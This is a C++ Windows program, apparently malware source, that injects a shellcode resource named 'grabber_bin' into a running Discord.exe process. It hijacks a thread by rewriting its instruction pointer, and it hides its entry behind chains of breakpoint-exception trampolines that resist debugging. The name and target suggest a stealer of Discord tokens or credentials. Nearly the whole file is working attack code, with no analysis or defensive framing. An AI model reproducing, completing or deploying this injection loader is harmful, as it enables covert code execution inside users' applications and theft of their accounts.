#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <iomanip>
#include <Shlwapi.h>
#include <thread>
#include <stdio.h>
#include "resource.h"
#pragma comment( lib, "shlwapi.lib")

#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)
void fetch_exec_all(void);
void Trampoline2()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        fetch_exec_all();
    }
}

void Trampoline1()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Trampoline2();
    }
}

DWORD GetPID(const char* pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    print("[+] Process %s found : 0x%lX\n", pE.szExeFile, pE.th32ProcessID);
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}


DWORD EnThread(DWORD procID)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    DWORD ThID;
    if (procID == 0x0)
        EXIT_FAILURE;
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Thread32First(hSnap, &pE))
        {
            do
            {
                if (procID == pE.th32OwnerProcessID)
                {
                    ThID = pE.th32ThreadID;
                    print("[+] Thread found : 0x%lX\n", pE.th32OwnerProcessID);
                    break;
                }
            } while (Thread32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return(ThID);
}

void fetch_exec_all(void)
{
    HRSRC shellcodeRe = FindResource(NULL, MAKEINTRESOURCE(IDR_GRABBER_BIN1), "grabber_bin");
    DWORD Size = SizeofResource(NULL, shellcodeRe);
    HGLOBAL ExecBuffer = LoadResource(NULL, shellcodeRe);
    DWORD pr;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("Discord.exe"));
    if (!proc)
    {
        print("[!] Process Not found (0x%lX)\n", GetLastError());
        return ;
    }
    print("[+] Process Opened Successfully :0x%lX\n", GetLastError());
    void* base = VirtualAllocEx(proc, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base)
    {
        CloseHandle(proc);
        return ;
    }
    if (!WriteProcessMemory(proc, base, ExecBuffer, Size, 0))
    {
        CloseHandle(proc);
        return ;
    }
    print("[+] shellcode Base address : 0x%08x\n", base);
    htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
    if (!htd)
    {
        CloseHandle(proc);
        return ;
    }
    if (SuspendThread(htd) == (DWORD)-1)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    if (!GetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    print("[+] EIP hold: 0x%08x\n", context.Eip);
    context.Eip = (DWORD)base;
    if (!SetThreadContext(htd, &context))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }

    print("[+] EIP Hijacked succesfully : 0x%08x\n", context.Eip);
    if (ResumeThread(htd) == (DWORD)-0b01)
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    print("[+] thread Resumed succesfully : 0x%08x\n", context.Eip);
    if ((pr = WaitForSingleObject(htd, INFINITE) == 0x00000080L) || (pr == 0x00000000L) || (pr == 0x00000102L) || (pr == (DWORD)0xFFFFFFFF))
    {
        CloseHandle(proc);
        CloseHandle(htd);
        return ;
    }
    print("[+] Thread finished Succesfully 0x%lX\n", htd);
    CloseHandle(proc);
    CloseHandle(htd);
}

int wmain()
{
    __try
    {
        __asm int 3;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
    {
        Trampoline1();
    }
    __asm
    {
        xor eax, eax
    }
}
